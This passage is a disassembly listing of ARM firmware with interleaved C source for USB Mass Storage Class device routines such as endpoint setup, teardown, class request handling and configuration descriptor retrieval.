 8008fca:	4b0f      	ldr	r3, [pc, #60]	; (8009008 <USBD_MSC_Init+0x11c>)
 8008fcc:	7819      	ldrb	r1, [r3, #0]
 8008fce:	2340      	movs	r3, #64	; 0x40
 8008fd0:	2202      	movs	r2, #2
 8008fd2:	6878      	ldr	r0, [r7, #4]
 8008fd4:	f003 fe8a 	bl	800ccec <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008fd8:	4b0b      	ldr	r3, [pc, #44]	; (8009008 <USBD_MSC_Init+0x11c>)
 8008fda:	781b      	ldrb	r3, [r3, #0]
 8008fdc:	f003 020f 	and.w	r2, r3, #15
 8008fe0:	6879      	ldr	r1, [r7, #4]
 8008fe2:	4613      	mov	r3, r2
 8008fe4:	009b      	lsls	r3, r3, #2
 8008fe6:	4413      	add	r3, r2
 8008fe8:	009b      	lsls	r3, r3, #2
 8008fea:	440b      	add	r3, r1
 8008fec:	3324      	adds	r3, #36	; 0x24
 8008fee:	2201      	movs	r2, #1
 8008ff0:	801a      	strh	r2, [r3, #0]
  }

  /* Init the BOT  layer */
  MSC_BOT_Init(pdev);
 8008ff2:	6878      	ldr	r0, [r7, #4]
 8008ff4:	f000 fa2c 	bl	8009450 <MSC_BOT_Init>

  return (uint8_t)USBD_OK;
 8008ff8:	2300      	movs	r3, #0
}
 8008ffa:	4618      	mov	r0, r3
 8008ffc:	3710      	adds	r7, #16
 8008ffe:	46bd      	mov	sp, r7
 8009000:	bd80      	pop	{r7, pc}
 8009002:	bf00      	nop
 8009004:	2000010b 	.word	0x2000010b
 8009008:	2000010a 	.word	0x2000010a

0800900c <USBD_MSC_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800900c:	b580      	push	{r7, lr}
 800900e:	b082      	sub	sp, #8
 8009010:	af00      	add	r7, sp, #0
 8009012:	6078      	str	r0, [r7, #4]
 8009014:	460b      	mov	r3, r1
 8009016:	70fb      	strb	r3, [r7, #3]
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close MSC EPs */
  (void)USBD_LL_CloseEP(pdev, MSCOutEpAdd);
 8009018:	4b26      	ldr	r3, [pc, #152]	; (80090b4 <USBD_MSC_DeInit+0xa8>)
 800901a:	781b      	ldrb	r3, [r3, #0]
 800901c:	4619      	mov	r1, r3
 800901e:	6878      	ldr	r0, [r7, #4]
 8009020:	f003 fea2 	bl	800cd68 <USBD_LL_CloseEP>
  pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 0U;
 8009024:	4b23      	ldr	r3, [pc, #140]	; (80090b4 <USBD_MSC_DeInit+0xa8>)
 8009026:	781b      	ldrb	r3, [r3, #0]
 8009028:	f003 020f 	and.w	r2, r3, #15
 800902c:	6879      	ldr	r1, [r7, #4]
 800902e:	4613      	mov	r3, r2
 8009030:	009b      	lsls	r3, r3, #2
 8009032:	4413      	add	r3, r2
 8009034:	009b      	lsls	r3, r3, #2
 8009036:	440b      	add	r3, r1
 8009038:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800903c:	2200      	movs	r2, #0
 800903e:	801a      	strh	r2, [r3, #0]

  /* Close EP IN */
  (void)USBD_LL_CloseEP(pdev, MSCInEpAdd);
 8009040:	4b1d      	ldr	r3, [pc, #116]	; (80090b8 <USBD_MSC_DeInit+0xac>)
 8009042:	781b      	ldrb	r3, [r3, #0]
 8009044:	4619      	mov	r1, r3
 8009046:	6878      	ldr	r0, [r7, #4]
 8009048:	f003 fe8e 	bl	800cd68 <USBD_LL_CloseEP>
  pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 0U;
 800904c:	4b1a      	ldr	r3, [pc, #104]	; (80090b8 <USBD_MSC_DeInit+0xac>)
 800904e:	781b      	ldrb	r3, [r3, #0]
 8009050:	f003 020f 	and.w	r2, r3, #15
 8009054:	6879      	ldr	r1, [r7, #4]
 8009056:	4613      	mov	r3, r2
 8009058:	009b      	lsls	r3, r3, #2
 800905a:	4413      	add	r3, r2
 800905c:	009b      	lsls	r3, r3, #2
 800905e:	440b      	add	r3, r1
 8009060:	3324      	adds	r3, #36	; 0x24
 8009062:	2200      	movs	r2, #0
 8009064:	801a      	strh	r2, [r3, #0]

  /* Free MSC Class Resources */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8009066:	687b      	ldr	r3, [r7, #4]
 8009068:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800906c:	687b      	ldr	r3, [r7, #4]
 800906e:	32b0      	adds	r2, #176	; 0xb0
 8009070:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009074:	2b00      	cmp	r3, #0
 8009076:	d018      	beq.n	80090aa <USBD_MSC_DeInit+0x9e>
  {
    /* De-Init the BOT layer */
    MSC_BOT_DeInit(pdev);
 8009078:	6878      	ldr	r0, [r7, #4]
 800907a:	f000 fa6f 	bl	800955c <MSC_BOT_DeInit>

    (void)USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 800907e:	687b      	ldr	r3, [r7, #4]
 8009080:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009084:	687b      	ldr	r3, [r7, #4]
 8009086:	32b0      	adds	r2, #176	; 0xb0
 8009088:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800908c:	4618      	mov	r0, r3
 800908e:	f004 f87d 	bl	800d18c <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId]  = NULL;
 8009092:	687b      	ldr	r3, [r7, #4]
 8009094:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009098:	687b      	ldr	r3, [r7, #4]
 800909a:	32b0      	adds	r2, #176	; 0xb0
 800909c:	2100      	movs	r1, #0
 800909e:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 80090a2:	687b      	ldr	r3, [r7, #4]
 80090a4:	2200      	movs	r2, #0
 80090a6:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 80090aa:	2300      	movs	r3, #0
}
 80090ac:	4618      	mov	r0, r3
 80090ae:	3708      	adds	r7, #8
 80090b0:	46bd      	mov	sp, r7
 80090b2:	bd80      	pop	{r7, pc}
 80090b4:	2000010b 	.word	0x2000010b
 80090b8:	2000010a 	.word	0x2000010a

080090bc <USBD_MSC_Setup>:
  * @param  pdev: device instance
  * @param  req: USB request
  * @retval status
  */
uint8_t USBD_MSC_Setup(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 80090bc:	b580      	push	{r7, lr}
 80090be:	b086      	sub	sp, #24
 80090c0:	af00      	add	r7, sp, #0
 80090c2:	6078      	str	r0, [r7, #4]
 80090c4:	6039      	str	r1, [r7, #0]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80090c6:	687b      	ldr	r3, [r7, #4]
 80090c8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80090cc:	687b      	ldr	r3, [r7, #4]
 80090ce:	32b0      	adds	r2, #176	; 0xb0
 80090d0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80090d4:	613b      	str	r3, [r7, #16]
  USBD_StatusTypeDef ret = USBD_OK;
 80090d6:	2300      	movs	r3, #0
 80090d8:	75fb      	strb	r3, [r7, #23]
  uint16_t status_info = 0U;
 80090da:	2300      	movs	r3, #0
 80090dc:	81fb      	strh	r3, [r7, #14]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80090de:	693b      	ldr	r3, [r7, #16]
 80090e0:	2b00      	cmp	r3, #0
 80090e2:	d101      	bne.n	80090e8 <USBD_MSC_Setup+0x2c>
  {
    return (uint8_t)USBD_FAIL;
 80090e4:	2303      	movs	r3, #3
 80090e6:	e0e1      	b.n	80092ac <USBD_MSC_Setup+0x1f0>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 80090e8:	683b      	ldr	r3, [r7, #0]
 80090ea:	781b      	ldrb	r3, [r3, #0]
 80090ec:	f003 0360 	and.w	r3, r3, #96	; 0x60
 80090f0:	2b00      	cmp	r3, #0
 80090f2:	d053      	beq.n	800919c <USBD_MSC_Setup+0xe0>
 80090f4:	2b20      	cmp	r3, #32
 80090f6:	f040 80d1 	bne.w	800929c <USBD_MSC_Setup+0x1e0>
  {
    /* Class request */
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 80090fa:	683b      	ldr	r3, [r7, #0]
 80090fc:	785b      	ldrb	r3, [r3, #1]
 80090fe:	2bfe      	cmp	r3, #254	; 0xfe
 8009100:	d002      	beq.n	8009108 <USBD_MSC_Setup+0x4c>
 8009102:	2bff      	cmp	r3, #255	; 0xff
 8009104:	d02a      	beq.n	800915c <USBD_MSC_Setup+0xa0>
 8009106:	e041      	b.n	800918c <USBD_MSC_Setup+0xd0>
      {
        case BOT_GET_MAX_LUN:
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8009108:	683b      	ldr	r3, [r7, #0]
 800910a:	885b      	ldrh	r3, [r3, #2]
 800910c:	2b00      	cmp	r3, #0
 800910e:	d11e      	bne.n	800914e <USBD_MSC_Setup+0x92>
 8009110:	683b      	ldr	r3, [r7, #0]
 8009112:	88db      	ldrh	r3, [r3, #6]
 8009114:	2b01      	cmp	r3, #1
 8009116:	d11a      	bne.n	800914e <USBD_MSC_Setup+0x92>
              ((req->bmRequest & 0x80U) == 0x80U))
 8009118:	683b      	ldr	r3, [r7, #0]
 800911a:	781b      	ldrb	r3, [r3, #0]
 800911c:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 800911e:	2b00      	cmp	r3, #0
 8009120:	da15      	bge.n	800914e <USBD_MSC_Setup+0x92>
          {
            hmsc->max_lun = (uint32_t)((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetMaxLun();
 8009122:	687b      	ldr	r3, [r7, #4]
 8009124:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009128:	687a      	ldr	r2, [r7, #4]
 800912a:	33b0      	adds	r3, #176	; 0xb0
 800912c:	009b      	lsls	r3, r3, #2
 800912e:	4413      	add	r3, r2
 8009130:	685b      	ldr	r3, [r3, #4]
 8009132:	699b      	ldr	r3, [r3, #24]
 8009134:	4798      	blx	r3
 8009136:	4603      	mov	r3, r0
 8009138:	461a      	mov	r2, r3
 800913a:	693b      	ldr	r3, [r7, #16]
 800913c:	601a      	str	r2, [r3, #0]
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->max_lun, 1U);
 800913e:	693b      	ldr	r3, [r7, #16]
 8009140:	2201      	movs	r2, #1
 8009142:	4619      	mov	r1, r3
 8009144:	6878      	ldr	r0, [r7, #4]
 8009146:	f003 f979 	bl	800c43c <USBD_CtlSendData>
 800914a:	bf00      	nop
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 800914c:	e025      	b.n	800919a <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 800914e:	6839      	ldr	r1, [r7, #0]
 8009150:	6878      	ldr	r0, [r7, #4]
 8009152:	f003 f902 	bl	800c35a <USBD_CtlError>
            ret = USBD_FAIL;
 8009156:	2303      	movs	r3, #3
 8009158:	75fb      	strb	r3, [r7, #23]
          break;
 800915a:	e01e      	b.n	800919a <USBD_MSC_Setup+0xde>

        case BOT_RESET :
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 800915c:	683b      	ldr	r3, [r7, #0]
 800915e:	885b      	ldrh	r3, [r3, #2]
 8009160:	2b00      	cmp	r3, #0
 8009162:	d10c      	bne.n	800917e <USBD_MSC_Setup+0xc2>
 8009164:	683b      	ldr	r3, [r7, #0]
 8009166:	88db      	ldrh	r3, [r3, #6]
 8009168:	2b00      	cmp	r3, #0
 800916a:	d108      	bne.n	800917e <USBD_MSC_Setup+0xc2>
              ((req->bmRequest & 0x80U) != 0x80U))
 800916c:	683b      	ldr	r3, [r7, #0]
 800916e:	781b      	ldrb	r3, [r3, #0]
 8009170:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8009172:	2b00      	cmp	r3, #0
 8009174:	db03      	blt.n	800917e <USBD_MSC_Setup+0xc2>
          {
            MSC_BOT_Reset(pdev);
 8009176:	6878      	ldr	r0, [r7, #4]
 8009178:	f000 f9bc 	bl	80094f4 <MSC_BOT_Reset>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 800917c:	e00d      	b.n	800919a <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 800917e:	6839      	ldr	r1, [r7, #0]
 8009180:	6878      	ldr	r0, [r7, #4]
 8009182:	f003 f8ea 	bl	800c35a <USBD_CtlError>
            ret = USBD_FAIL;
 8009186:	2303      	movs	r3, #3
 8009188:	75fb      	strb	r3, [r7, #23]
          break;
 800918a:	e006      	b.n	800919a <USBD_MSC_Setup+0xde>

        default:
          USBD_CtlError(pdev, req);
 800918c:	6839      	ldr	r1, [r7, #0]
 800918e:	6878      	ldr	r0, [r7, #4]
 8009190:	f003 f8e3 	bl	800c35a <USBD_CtlError>
          ret = USBD_FAIL;
 8009194:	2303      	movs	r3, #3
 8009196:	75fb      	strb	r3, [r7, #23]
          break;
 8009198:	bf00      	nop
      }
      break;
 800919a:	e086      	b.n	80092aa <USBD_MSC_Setup+0x1ee>
    /* Interface & Endpoint request */
    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800919c:	683b      	ldr	r3, [r7, #0]
 800919e:	785b      	ldrb	r3, [r3, #1]
 80091a0:	2b0b      	cmp	r3, #11
 80091a2:	d872      	bhi.n	800928a <USBD_MSC_Setup+0x1ce>
 80091a4:	a201      	add	r2, pc, #4	; (adr r2, 80091ac <USBD_MSC_Setup+0xf0>)
 80091a6:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80091aa:	bf00      	nop
 80091ac:	080091dd 	.word	0x080091dd
 80091b0:	08009259 	.word	0x08009259
 80091b4:	0800928b 	.word	0x0800928b
 80091b8:	0800928b 	.word	0x0800928b
 80091bc:	0800928b 	.word	0x0800928b
 80091c0:	0800928b 	.word	0x0800928b
 80091c4:	0800928b 	.word	0x0800928b
 80091c8:	0800928b 	.word	0x0800928b
 80091cc:	0800928b 	.word	0x0800928b
 80091d0:	0800928b 	.word	0x0800928b
 80091d4:	08009207 	.word	0x08009207
 80091d8:	08009231 	.word	0x08009231
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80091dc:	687b      	ldr	r3, [r7, #4]
 80091de:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80091e2:	b2db      	uxtb	r3, r3
 80091e4:	2b03      	cmp	r3, #3
 80091e6:	d107      	bne.n	80091f8 <USBD_MSC_Setup+0x13c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 80091e8:	f107 030e 	add.w	r3, r7, #14
 80091ec:	2202      	movs	r2, #2
 80091ee:	4619      	mov	r1, r3
 80091f0:	6878      	ldr	r0, [r7, #4]
 80091f2:	f003 f923 	bl	800c43c <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80091f6:	e050      	b.n	800929a <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 80091f8:	6839      	ldr	r1, [r7, #0]
 80091fa:	6878      	ldr	r0, [r7, #4]
 80091fc:	f003 f8ad 	bl	800c35a <USBD_CtlError>
            ret = USBD_FAIL;
 8009200:	2303      	movs	r3, #3
 8009202:	75fb      	strb	r3, [r7, #23]
          break;
 8009204:	e049      	b.n	800929a <USBD_MSC_Setup+0x1de>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009206:	687b      	ldr	r3, [r7, #4]
 8009208:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800920c:	b2db      	uxtb	r3, r3
 800920e:	2b03      	cmp	r3, #3
 8009210:	d107      	bne.n	8009222 <USBD_MSC_Setup+0x166>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->interface, 1U);
 8009212:	693b      	ldr	r3, [r7, #16]
 8009214:	3304      	adds	r3, #4
 8009216:	2201      	movs	r2, #1
 8009218:	4619      	mov	r1, r3
 800921a:	6878      	ldr	r0, [r7, #4]
 800921c:	f003 f90e 	bl	800c43c <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009220:	e03b      	b.n	800929a <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8009222:	6839      	ldr	r1, [r7, #0]
 8009224:	6878      	ldr	r0, [r7, #4]
 8009226:	f003 f898 	bl	800c35a <USBD_CtlError>
            ret = USBD_FAIL;
 800922a:	2303      	movs	r3, #3
 800922c:	75fb      	strb	r3, [r7, #23]
          break;
 800922e:	e034      	b.n	800929a <USBD_MSC_Setup+0x1de>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009230:	687b      	ldr	r3, [r7, #4]
 8009232:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009236:	b2db      	uxtb	r3, r3
 8009238:	2b03      	cmp	r3, #3
 800923a:	d106      	bne.n	800924a <USBD_MSC_Setup+0x18e>
          {
            hmsc->interface = (uint8_t)(req->wValue);
 800923c:	683b      	ldr	r3, [r7, #0]
 800923e:	885b      	ldrh	r3, [r3, #2]
 8009240:	b2db      	uxtb	r3, r3
 8009242:	461a      	mov	r2, r3
 8009244:	693b      	ldr	r3, [r7, #16]
 8009246:	605a      	str	r2, [r3, #4]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009248:	e027      	b.n	800929a <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 800924a:	6839      	ldr	r1, [r7, #0]
 800924c:	6878      	ldr	r0, [r7, #4]
 800924e:	f003 f884 	bl	800c35a <USBD_CtlError>
            ret = USBD_FAIL;
 8009252:	2303      	movs	r3, #3
 8009254:	75fb      	strb	r3, [r7, #23]
          break;
 8009256:	e020      	b.n	800929a <USBD_MSC_Setup+0x1de>

        case USB_REQ_CLEAR_FEATURE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009258:	687b      	ldr	r3, [r7, #4]
 800925a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800925e:	b2db      	uxtb	r3, r3
 8009260:	2b03      	cmp	r3, #3
 8009262:	d119      	bne.n	8009298 <USBD_MSC_Setup+0x1dc>
          {
            if (req->wValue == USB_FEATURE_EP_HALT)
 8009264:	683b      	ldr	r3, [r7, #0]
 8009266:	885b      	ldrh	r3, [r3, #2]
 8009268:	2b00      	cmp	r3, #0
 800926a:	d115      	bne.n	8009298 <USBD_MSC_Setup+0x1dc>
            {
              /* Flush the FIFO */
              (void)USBD_LL_FlushEP(pdev, (uint8_t)req->wIndex);
 800926c:	683b      	ldr	r3, [r7, #0]
 800926e:	889b      	ldrh	r3, [r3, #4]
 8009270:	b2db      	uxtb	r3, r3
 8009272:	4619      	mov	r1, r3
 8009274:	6878      	ldr	r0, [r7, #4]
 8009276:	f003 fdad 	bl	800cdd4 <USBD_LL_FlushEP>

              /* Handle BOT error */
              MSC_BOT_CplClrFeature(pdev, (uint8_t)req->wIndex);
 800927a:	683b      	ldr	r3, [r7, #0]
 800927c:	889b      	ldrh	r3, [r3, #4]
 800927e:	b2db      	uxtb	r3, r3
 8009280:	4619      	mov	r1, r3
 8009282:	6878      	ldr	r0, [r7, #4]
 8009284:	f000 fb54 	bl	8009930 <MSC_BOT_CplClrFeature>
            }
          }
          break;
 8009288:	e006      	b.n	8009298 <USBD_MSC_Setup+0x1dc>

        default:
          USBD_CtlError(pdev, req);
 800928a:	6839      	ldr	r1, [r7, #0]
 800928c:	6878      	ldr	r0, [r7, #4]
 800928e:	f003 f864 	bl	800c35a <USBD_CtlError>
          ret = USBD_FAIL;
 8009292:	2303      	movs	r3, #3
 8009294:	75fb      	strb	r3, [r7, #23]
          break;
 8009296:	e000      	b.n	800929a <USBD_MSC_Setup+0x1de>
          break;
 8009298:	bf00      	nop
      }
      break;
 800929a:	e006      	b.n	80092aa <USBD_MSC_Setup+0x1ee>

    default:
      USBD_CtlError(pdev, req);
 800929c:	6839      	ldr	r1, [r7, #0]
 800929e:	6878      	ldr	r0, [r7, #4]
 80092a0:	f003 f85b 	bl	800c35a <USBD_CtlError>
      ret = USBD_FAIL;
 80092a4:	2303      	movs	r3, #3
 80092a6:	75fb      	strb	r3, [r7, #23]
      break;
 80092a8:	bf00      	nop
  }

  return (uint8_t)ret;
 80092aa:	7dfb      	ldrb	r3, [r7, #23]
}
 80092ac:	4618      	mov	r0, r3
 80092ae:	3718      	adds	r7, #24
 80092b0:	46bd      	mov	sp, r7
 80092b2:	bd80      	pop	{r7, pc}

080092b4 <USBD_MSC_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80092b4:	b580      	push	{r7, lr}
 80092b6:	b082      	sub	sp, #8
 80092b8:	af00      	add	r7, sp, #0
 80092ba:	6078      	str	r0, [r7, #4]
 80092bc:	460b      	mov	r3, r1
 80092be:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataIn(pdev, epnum);
 80092c0:	78fb      	ldrb	r3, [r7, #3]
 80092c2:	4619      	mov	r1, r3
 80092c4:	6878      	ldr	r0, [r7, #4]
 80092c6:	f000 f961 	bl	800958c <MSC_BOT_DataIn>

  return (uint8_t)USBD_OK;
 80092ca:	2300      	movs	r3, #0
}
 80092cc:	4618      	mov	r0, r3
 80092ce:	3708      	adds	r7, #8
 80092d0:	46bd      	mov	sp, r7
 80092d2:	bd80      	pop	{r7, pc}

080092d4 <USBD_MSC_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80092d4:	b580      	push	{r7, lr}
 80092d6:	b082      	sub	sp, #8
 80092d8:	af00      	add	r7, sp, #0
 80092da:	6078      	str	r0, [r7, #4]
 80092dc:	460b      	mov	r3, r1
 80092de:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataOut(pdev, epnum);
 80092e0:	78fb      	ldrb	r3, [r7, #3]
 80092e2:	4619      	mov	r1, r3
 80092e4:	6878      	ldr	r0, [r7, #4]
 80092e6:	f000 f98d 	bl	8009604 <MSC_BOT_DataOut>

  return (uint8_t)USBD_OK;
 80092ea:	2300      	movs	r3, #0
}
 80092ec:	4618      	mov	r0, r3
 80092ee:	3708      	adds	r7, #8
 80092f0:	46bd      	mov	sp, r7
 80092f2:	bd80      	pop	{r7, pc}

080092f4 <USBD_MSC_GetHSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetHSCfgDesc(uint16_t *length)
{
 80092f4:	b580      	push	{r7, lr}
 80092f6:	b084      	sub	sp, #16
 80092f8:	af00      	add	r7, sp, #0
 80092fa:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 80092fc:	2181      	movs	r1, #129	; 0x81
 80092fe:	4812      	ldr	r0, [pc, #72]	; (8009348 <USBD_MSC_GetHSCfgDesc+0x54>)
 8009300:	f002 f9c8 	bl	800b694 <USBD_GetEpDesc>
 8009304:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 8009306:	2101      	movs	r1, #1
 8009308:	480f      	ldr	r0, [pc, #60]	; (8009348 <USBD_MSC_GetHSCfgDesc+0x54>)
 800930a:	f002 f9c3 	bl	800b694 <USBD_GetEpDesc>
 800930e:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009310:	68fb      	ldr	r3, [r7, #12]
 8009312:	2b00      	cmp	r3, #0
 8009314:	d006      	beq.n	8009324 <USBD_MSC_GetHSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 8009316:	68fb      	ldr	r3, [r7, #12]
 8009318:	2200      	movs	r2, #0
 800931a:	711a      	strb	r2, [r3, #4]
 800931c:	2200      	movs	r2, #0
 800931e:	f042 0202 	orr.w	r2, r2, #2
 8009322:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 8009324:	68bb      	ldr	r3, [r7, #8]
 8009326:	2b00      	cmp	r3, #0
 8009328:	d006      	beq.n	8009338 <USBD_MSC_GetHSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 800932a:	68bb      	ldr	r3, [r7, #8]
 800932c:	2200      	movs	r2, #0
 800932e:	711a      	strb	r2, [r3, #4]
 8009330:	2200      	movs	r2, #0
 8009332:	f042 0202 	orr.w	r2, r2, #2
 8009336:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009338:	687b      	ldr	r3, [r7, #4]
 800933a:	2220      	movs	r2, #32
 800933c:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 800933e:	4b02      	ldr	r3, [pc, #8]	; (8009348 <USBD_MSC_GetHSCfgDesc+0x54>)
}
 8009340:	4618      	mov	r0, r3
 8009342:	3710      	adds	r7, #16
 8009344:	46bd      	mov	sp, r7
 8009346:	bd80      	pop	{r7, pc}
 8009348:	200000e0 	.word	0x200000e0

0800934c <USBD_MSC_GetFSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetFSCfgDesc(uint16_t *length)
{
 800934c:	b580      	push	{r7, lr}
 800934e:	b084      	sub	sp, #16
 8009350:	af00      	add	r7, sp, #0
 8009352:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009354:	2181      	movs	r1, #129	; 0x81
 8009356:	4812      	ldr	r0, [pc, #72]	; (80093a0 <USBD_MSC_GetFSCfgDesc+0x54>)
 8009358:	f002 f99c 	bl	800b694 <USBD_GetEpDesc>
 800935c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 800935e:	2101      	movs	r1, #1
 8009360:	480f      	ldr	r0, [pc, #60]	; (80093a0 <USBD_MSC_GetFSCfgDesc+0x54>)
 8009362:	f002 f997 	bl	800b694 <USBD_GetEpDesc>
 8009366:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009368:	68fb      	ldr	r3, [r7, #12]
 800936a:	2b00      	cmp	r3, #0
 800936c:	d006      	beq.n	800937c <USBD_MSC_GetFSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800936e:	68fb      	ldr	r3, [r7, #12]
 8009370:	2200      	movs	r2, #0
 8009372:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009376:	711a      	strb	r2, [r3, #4]
 8009378:	2200      	movs	r2, #0
 800937a:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 800937c:	68bb      	ldr	r3, [r7, #8]
 800937e:	2b00      	cmp	r3, #0
 8009380:	d006      	beq.n	8009390 <USBD_MSC_GetFSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 8009382:	68bb      	ldr	r3, [r7, #8]
 8009384:	2200      	movs	r2, #0
 8009386:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 800938a:	711a      	strb	r2, [r3, #4]
 800938c:	2200      	movs	r2, #0
 800938e:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009390:	687b      	ldr	r3, [r7, #4]
 8009392:	2220      	movs	r2, #32
 8009394:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 8009396:	4b02      	ldr	r3, [pc, #8]	; (80093a0 <USBD_MSC_GetFSCfgDesc+0x54>)
}
 8009398:	4618      	mov	r0, r3
 800939a:	3710      	adds	r7, #16
 800939c:	46bd      	mov	sp, r7
 800939e:	bd80      	pop	{r7, pc}
 80093a0:	200000e0 	.word	0x200000e0

080093a4 <USBD_MSC_GetOtherSpeedCfgDesc>:
  *         return other speed configuration descriptor
